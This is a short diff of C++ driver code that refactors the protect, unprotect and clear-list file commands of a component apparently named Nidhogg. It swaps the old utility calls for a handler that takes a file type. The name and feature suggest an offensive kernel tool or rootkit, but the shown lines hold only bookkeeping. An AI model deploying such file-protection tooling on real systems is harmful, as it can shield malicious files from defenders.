@@ -51,16 +51,9 @@ NTSTATUS FileParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	{
 		protectedFile.Protect = true;
 
-		if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
+		if (!NidhoggFileHandler->ProtectFile(protectedFile.FilePath)) {
+			status = STATUS_UNSUCCESSFUL;
 			break;
-		}
-
-		if (!NidhoggFileUtils->FindFile(protectedFile.FilePath)) {
-			if (!NidhoggFileUtils->AddFile(protectedFile.FilePath)) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
 		}
 		break;
 	}
@@ -68,12 +61,7 @@ NTSTATUS FileParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	{
 		protectedFile.Protect = false;
 
-		if (NidhoggFileUtils->GetFilesCount() == 0) {
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
-
-		if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
+		if (!NidhoggFileHandler->RemoveFile(protectedFile.FilePath, FileType::Protected)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
@@ -81,7 +69,7 @@ NTSTATUS FileParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	}
 	case Options::Clear:
 	{
-		NidhoggFileUtils->ClearFilesList();
+		NidhoggFileHandler->ClearFilesList(FileType::Protected);
 		break;
 	}
 	default:
